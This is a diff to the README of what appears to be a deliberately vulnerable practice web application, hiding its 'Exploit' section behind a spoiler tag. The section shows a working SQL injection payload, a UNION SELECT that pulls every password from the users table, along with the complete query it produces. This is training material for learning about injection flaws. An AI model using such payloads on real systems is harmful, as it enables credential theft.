@@ -32,14 +32,17 @@ The application is then accessible on [http://localhost:8080/](http://localhost:
 
 ## Exploit
 
-Here is an example of a working payload, esposing all passwords in the table:
+<details>
+  <summary>Warninng ! Contains spoilers !</summary>
+    Here is an example of a working payload, esposing all passwords in the table:
 
-```sql
-nothing%" UNION SELECT pass, nickname, email FROM users#
-```
+    ```sql
+    nothing%" UNION SELECT pass, nickname, email FROM users#
+    ```
 
-Resulting in the following complete query :
+    Resulting in the following complete query :
 
-```sql
-SELECT id, nickname, email FROM users WHERE nickname LIKE "%nothing%" UNION SELECT pass, nickname, email FROM users#%"
-```
+    ```sql
+    SELECT id, nickname, email FROM users WHERE nickname LIKE "%nothing%" UNION SELECT pass, nickname, email FROM users#%"
+    ```
+</details>
